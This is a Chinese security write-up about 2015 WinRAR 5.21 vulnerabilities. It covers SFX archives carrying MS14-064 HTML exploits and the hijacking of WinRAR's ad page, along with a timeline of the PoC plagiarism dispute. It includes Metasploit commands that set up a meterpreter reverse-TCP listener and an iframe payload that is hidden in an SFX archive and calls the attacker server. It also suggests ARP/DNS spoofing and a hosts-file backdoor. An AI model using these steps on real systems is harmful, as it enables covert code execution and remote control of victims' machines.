# WinRAR(5.21)-0day漏洞-始末分析

0x00 前言
=======

* * *

上月底，WinRAR 5.21被曝出代码执行漏洞,Vulnerability Lab将此漏洞评为高危级，危险系数定为9(满分为10)，与此同时安全研究人员Mohammad Reza Espargham发布了PoC，实现了用户打开SFX文件时隐蔽执行攻击代码，但是WinRAR官方RARLabs认为该功能是软件安装必备，没有必要发布任何修复补丁或升级版本。

本以为就此可以跳过该漏洞，但深入研究后发现了更加有趣的事情。

![这里写图片描述](http://drops.javaweb.org/uploads/images/9c2ec5faf90c438c6cf44aa6dd18c58cc8e53395.jpg)

0x01 WinRar 5.21 - SFX OLE 代码执行漏洞
=================================

* * *

简要介绍一下WinRar 5.21 - SFX OLE 代码执行漏洞

1、相关概念
------

**SFX：**SelF-eXtracting的缩写，中文翻译自解压文件，是压缩文件的一种，其可以在没有安装压缩软件的情况下执行解压缩

**MS14-064：**Microsoft Windows OLE远程代码执行漏洞，影响Win95+IE3 – Win10+IE11全版本，实际使用时在win7以上系统由于IE存在沙箱机制，启动白名单以外的进程会弹出提示，如图

![这里写图片描述](http://drops.javaweb.org/uploads/images/60aee3b9f0a14328e28461ad54c64cf4cbc4816f.jpg)

2、漏洞原理
------

sfx文件在创建时支持添加html脚本，但又不会受IE沙箱限制，如果主机存在MS14-064漏洞，在打开包含MS14-064 exp的sfx文件后，即可隐蔽执行任意代码

3、测试环境
------

```
win7 x86
存在MS14-064漏洞
安装WinRar 5.21

```

4、测试过程
------

实现相对简单，因此只作简要介绍

**（1）**搭建server

```
use exploit/windows/browser/ms14_064_ole_code_execution
set payload windows/meterpreter/reverse_tcp
set LHOST 192.168.40.131
set LPORT 1234
exploit

```

如图

![这里写图片描述](http://drops.javaweb.org/uploads/images/845544cd7a43e56e910930f7fa065cf391111ac0.jpg)

**（2）**生成SFX

```
选择一个文件右键并添加到压缩文件
选中Create SFX archive
点击Advanced
点击SFX options
点击Text and icon

```

在Text to display in SFX windows中输入如下代码：

```
<iframe src="http://192.168.40.131:8080/YrrArF9oTAQ7j"></iframe>

```

**（3）**运行sfx文件

双击后meterpreter即上线

5、分析
----

1.  这种在sfx文件中添加html代码的方法很久以前已经出现，比如早在08年已存在的Winrar挂马 相关链接：http://www.2cto.com/Article/200804/25081.html
2.  此漏洞的亮点在于使得MS14-064漏洞exp可以逃脱IE沙箱的限制
3.  发现是否包含SFX OLE 代码执行漏洞的方法：遇到后缀为.exe的压缩文件，右键-属性-注释，查看其中的内容如图

![这里写图片描述](http://drops.javaweb.org/uploads/images/730879e6b8a43a2757df46ff273315b3d3c7c648.jpg)

0x02 poc之谜
==========

* * *

Vulnerability Lab和Malwarebytes以及各大网站夸大漏洞危害本就十分有趣，而poc作者的归属又引来了更加有趣的事情。

接下来根据搜集的信息整理出如下时间节点：

1、seclists.org曝出WinRAR 5.21代码执行漏洞
---------------------------------

文中公开Mohammad Reza Espargham的poc

日期：28/09/2015

相关链接：[http://seclists.org/fulldisclosure/2015/Sep/106](http://seclists.org/fulldisclosure/2015/Sep/106)

2、WinRar官方RARLabs作出第一次回应
------------------------

> 限制SFX模块中的HTML功能会影响正常用户使用，而且攻击者仍可利用旧版SFX模块、来自非UnRAR源代码的自定义模块、或者自建代码存档进行攻击 所以RARLabs拒绝为此提供补丁并再次提醒用户，无论任何文件，都应该确认其来源是否可信

相关链接：[http://www.rarlab.com/vuln_sfx_html.htm](http://www.rarlab.com/vuln_sfx_html.htm)

3、RARLabs作出第二次回应
----------------

> 指出该漏洞夸大其辞毫无意义，建议用户更多去关注windows系统的安全，而不是WinRar软件的本身 在最后提到R-73eN ( RioSherri )举报Mohammad Reza Espargham抄袭其poc代码

相关链接：[http://www.rarlab.com/vuln_sfx_html2.htm](http://www.rarlab.com/vuln_sfx_html2.htm)

4、0day.today或许可以证明存在抄袭
----------------------

**（1）**R-73eN首发poc

日期：25/09/2015

相关链接:[http://0day.today/exploit/24292](http://0day.today/exploit/24292)

**（2）**Mohammad Reza Espargham随后发布poc

日期：26-09-2015

相关链接:[http://cn.0day.today/exploit/24296](http://cn.0day.today/exploit/24296)

5、R-73eN为证明实力公布第二个漏洞WinRAR(过期通知) OLE远程代码执行漏洞poc
-----------------------------------------------

日期：30-09-2015

相关链接:[http://0day.today/exploit/24326](http://0day.today/exploit/24326)

6、RARLabs针对R-73eN公布的第二个漏洞作出回应，拒绝修复
----------------------------------

```
-试用版WinRaR会弹出提示注册的窗口，该漏洞被利用存在可能
-利用条件：
    网络被劫持
    未安装MS14-064漏洞补丁
-但是又指出如果满足利用条件，那么系统本身已经不安全，早已超出WinRaR软件自身范畴
-因此拒绝为此漏洞更新补丁

```

相关链接:[http://www.rarlab.com/vuln_web_html.htm](http://www.rarlab.com/vuln_web_html.htm)

0x03 WinRAR - (过期通知&广告) OLE 远程代码执行漏洞
====================================

* * *

虽然WinRAR(过期通知) OLE远程代码执行漏洞也被RARLabs忽略，但其中的思路很是有趣，当然R-73eN公布的poc需要作部分修改来适用更多winRAR环境

1、相关知识
------

我们在使用WinRAR的时候常常会遇到如下情况：

```
打开WinRAR时会弹出广告，提示用户付费去掉广告，而不同版本WinRaR广告的链接会存在差异
英文版目前最新为5.30 beta5
中文版目前最新为5.21
英文版广告链接：http://www.win-rar.com/notifier/
中文版广告链接：http://www.winrar.com.cn/ad/***

```

2、漏洞原理
------

WinRAR默认会访问特定网址，如果能够劫持并替换为MS14-064的攻击代码，那么远程执行任意代码不在话下，当然也能逃脱IE沙箱限制

3、测试环境
------

```
win7 x86
存在MS14-064漏洞
安装WinRar 5.21 cn

```

4、测试过程
------

（1）搭建server 下载poc，相关链接：[http://0day.today/exploit/24326](http://0day.today/exploit/24326)

poc需要作细微修改（此处暂不提供修改方法），执行python脚本，如图

![这里写图片描述](http://drops.javaweb.org/uploads/images/71d72830f60edded5cee9b82a9d75a0a914d0d32.jpg)

注：如果了解MS14-064漏洞原理，此处修改轻而易举

（2）重定向`http://www.winrar.com.cn`至server ip

可使用arp欺骗和dns欺骗

（3）使用WinRar打开任意文件

默认弹出广告，触发漏洞，弹出计算器，如图

![这里写图片描述](http://drops.javaweb.org/uploads/images/3c99d2d6db5520d7b7c1b5f6f97f30bba37121be.jpg)

![这里写图片描述](http://drops.javaweb.org/uploads/images/ee18b53ef73a3be2b539937a0f061b6178edc7f8.jpg)

5、分析
----

1.  虽然该漏洞条件限制相对多，但该思路很有启发性，可以尝试利用其他软件默认弹出网页的情况
2.  可以通过修改主机host文件永久更改广告链接至serverip，最终实现一种另类的后门启动方式
3.  针对此漏洞的防范:
    *   阻止网络被劫持
    *   安装MS14-064漏洞补丁

0x04 小结
=======

* * *

WinRar的漏洞相对较少，但如果结合其他攻击方式能否突破其官方宣称的安全逻辑，值得继续研究。

本文由三好学生原创并首发于乌云drops，转载请注明